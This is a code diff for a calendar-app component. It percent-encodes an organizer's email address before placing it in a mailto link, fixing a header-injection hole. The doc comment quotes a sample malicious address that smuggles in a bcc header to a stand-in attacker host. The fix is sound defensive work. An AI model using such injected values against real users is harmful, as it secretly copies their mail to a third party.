@@ -42,6 +42,25 @@ export function OwnershipPill({ ownership, organizer }: Props) {
   );
 }
 
+/**
+ * An organizer's address, as the `to` of a mailto URI (RFC 6068 section 2:
+ * every reserved character in `to` is percent-encoded).
+ *
+ * The address is invite data — `attendee_details` is filled from whatever the
+ * provider sent, and `normalizeAttendees` only asks for a string — and it was
+ * interpolated raw ahead of this URI's own `?subject=&body=`. An "address" of
+ * `host@co.test?bcc=harvest@evil.example&` therefore added a header of its
+ * own, so the mail the user is about to send about their own meeting carried a
+ * blind copy to whoever sent the invite. The scheme needs no allowlist here,
+ * unlike every href built from a provider-supplied URL (`safeLinkUrl`): it is
+ * the literal `mailto:` and an address cannot change it.
+ *
+ * `@` is kept literal — `encodeURIComponent` would make it `%40`, which the
+ * mailto ABNF does not allow in an addr-spec — while `?`, `&` and `#`, the
+ * three characters that could start a header, are all encoded.
+ */
+const mailtoAddress = (email: string): string => encodeURIComponent(email).replace(/%40/g, "@");
+
 export function ParticipantNotice({
   event,
   organizer,
@@ -58,7 +77,7 @@ export function ParticipantNotice({
       `It's clashing with my focus time.\n\nThanks!`,
   );
   const mailto = organizer?.email
-    ? `mailto:${organizer.email}?subject=${subject}&body=${body}`
+    ? `mailto:${mailtoAddress(organizer.email)}?subject=${subject}&body=${body}`
     : null;
 
   return (
